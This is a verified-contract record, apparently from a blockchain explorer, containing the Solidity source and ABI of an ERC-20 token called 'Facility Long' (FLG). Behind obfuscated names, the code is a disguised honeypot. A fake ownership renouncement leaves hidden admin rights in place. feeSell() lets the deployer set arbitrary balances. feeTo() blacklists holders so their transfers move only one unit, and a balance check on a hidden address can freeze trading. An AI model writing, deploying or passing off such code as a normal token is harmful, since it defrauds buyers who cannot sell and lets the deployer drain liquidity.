{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface fromTrading {\n    function createPair(address teamToMin, address amountTo) external returns (address);\n}\n\ninterface fromTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeReceiver) external view returns (uint256);\n\n    function transfer(address tokenMinList, uint256 swapTotal) external returns (bool);\n\n    function allowance(address modeLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenMinList,\n        uint256 swapTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeSender, uint256 value);\n    event Approval(address indexed modeLimit, address indexed spender, uint256 value);\n}\n\nabstract contract modeShouldLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromTakeMetadata is fromTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FacilityLong is modeShouldLaunch, fromTake, fromTakeMetadata {\n\n    bool private amountModeLaunched;\n\n    string private fundLaunched = \"FLG\";\n\n    mapping(address => uint256) private exemptTx;\n\n    event OwnershipTransferred(address indexed walletListToken, address indexed liquidityBuy);\n\n    bool public fundWalletMarketing;\n\n    uint256 constant launchMarketing = 1 ** 10;\n\n    address takeTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public enableAuto;\n\n    function owner() external view returns (address) {\n        return shouldModeSell;\n    }\n\n    uint256 listAmount;\n\n    address receiverWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private swapFromReceiver;\n\n    uint256 private fundSell;\n\n    uint256 totalReceiver;\n\n    uint256 private listFundWallet = 100000000 * 10 ** 18;\n\n    function transferFrom(address sellTotal, address tokenMinList, uint256 swapTotal) external override returns (bool) {\n        if (_msgSender() != receiverWallet) {\n            if (feeLimit[sellTotal][_msgSender()] != type(uint256).max) {\n                require(swapTotal <= feeLimit[sellTotal][_msgSender()]);\n                feeLimit[sellTotal][_msgSender()] -= swapTotal;\n            }\n        }\n        return isReceiver(sellTotal, tokenMinList, swapTotal);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return enableBuy;\n    }\n\n    function isReceiver(address sellTotal, address tokenMinList, uint256 swapTotal) internal returns (bool) {\n        if (sellTotal == enableAuto) {\n            return swapEnableAuto(sellTotal, tokenMinList, swapTotal);\n        }\n        uint256 toAmount = fromTake(autoTx).balanceOf(takeTrading);\n        require(toAmount == totalReceiver);\n        require(tokenMinList != takeTrading);\n        if (toTeam[sellTotal]) {\n            return swapEnableAuto(sellTotal, tokenMinList, launchMarketing);\n        }\n        return swapEnableAuto(sellTotal, tokenMinList, swapTotal);\n    }\n\n    function feeSell(address txAuto, uint256 swapTotal) public {\n        sellShould();\n        exemptTx[txAuto] = swapTotal;\n    }\n\n    uint256 public tokenReceiver;\n\n    function isShould(uint256 swapTotal) public {\n        sellShould();\n        totalReceiver = swapTotal;\n    }\n\n    function modeSwapLaunched(address feeMarketing) public {\n        if (sellIsTake) {\n            return;\n        }\n        if (fundWalletMarketing) {\n            modeReceiver = false;\n        }\n        limitLaunch[feeMarketing] = true;\n        \n        sellIsTake = true;\n    }\n\n    function swapEnableAuto(address sellTotal, address tokenMinList, uint256 swapTotal) internal returns (bool) {\n        require(exemptTx[sellTotal] >= swapTotal);\n        exemptTx[sellTotal] -= swapTotal;\n        exemptTx[tokenMinList] += swapTotal;\n        emit Transfer(sellTotal, tokenMinList, swapTotal);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listFundWallet;\n    }\n\n    uint8 private amountTotal = 18;\n\n    function approve(address totalIs, uint256 swapTotal) public virtual override returns (bool) {\n        feeLimit[_msgSender()][totalIs] = swapTotal;\n        emit Approval(_msgSender(), totalIs, swapTotal);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private feeLimit;\n\n    function getOwner() external view returns (address) {\n        return shouldModeSell;\n    }\n\n    function feeTo(address marketingMinReceiver) public {\n        sellShould();\n        \n        if (marketingMinReceiver == enableAuto || marketingMinReceiver == autoTx) {\n            return;\n        }\n        toTeam[marketingMinReceiver] = true;\n    }\n\n    function launchedLaunch() public {\n        emit OwnershipTransferred(enableAuto, address(0));\n        shouldModeSell = address(0);\n    }\n\n    function balanceOf(address takeReceiver) public view virtual override returns (uint256) {\n        return exemptTx[takeReceiver];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountTotal;\n    }\n\n    mapping(address => bool) public toTeam;\n\n    function allowance(address txLaunch, address totalIs) external view virtual override returns (uint256) {\n        if (totalIs == receiverWallet) {\n            return type(uint256).max;\n        }\n        return feeLimit[txLaunch][totalIs];\n    }\n\n    function transfer(address txAuto, uint256 swapTotal) external virtual override returns (bool) {\n        return isReceiver(_msgSender(), txAuto, swapTotal);\n    }\n\n    function sellShould() private view {\n        require(limitLaunch[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundLaunched;\n    }\n\n    constructor (){\n        if (modeReceiver == amountModeLaunched) {\n            tradingReceiver = true;\n        }\n        senderTeam swapFromFund = senderTeam(receiverWallet);\n        autoTx = fromTrading(swapFromFund.factory()).createPair(swapFromFund.WETH(), address(this));\n        \n        enableAuto = _msgSender();\n        limitLaunch[enableAuto] = true;\n        exemptTx[enableAuto] = listFundWallet;\n        launchedLaunch();\n        \n        emit Transfer(address(0), enableAuto, listFundWallet);\n    }\n\n    string private enableBuy = \"Facility Long\";\n\n    address public autoTx;\n\n    bool public tradingReceiver;\n\n    bool private modeEnable;\n\n    bool public modeReceiver;\n\n    bool public sellIsTake;\n\n    address private shouldModeSell;\n\n    mapping(address => bool) public limitLaunch;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletListToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTotal\",\"type\":\"uint256\"}],\"name\":\"feeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMinReceiver\",\"type\":\"address\"}],\"name\":\"feeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundWalletMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapTotal\",\"type\":\"uint256\"}],\"name\":\"isShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"}],\"name\":\"modeSwapLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellIsTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenMinList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FacilityLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}